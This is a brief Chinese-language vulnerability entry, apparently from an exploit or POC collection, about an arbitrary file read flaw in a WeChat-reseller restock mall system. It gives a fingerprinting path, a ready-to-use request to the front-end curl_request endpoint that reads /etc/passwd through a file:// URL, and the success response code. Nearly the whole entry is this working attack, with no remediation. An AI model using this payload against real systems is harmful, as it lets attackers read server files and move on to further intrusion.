# 微商代理商补货商城系统存在前台curl_request任意文件读取漏洞

微商代理商补货商城系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"/template/mobile/new/static/assets/js/comm.js"`

**Payload**
```
/Mobile/address/curl_request?url=file:///etc/passwd
```
- **响应特征**：200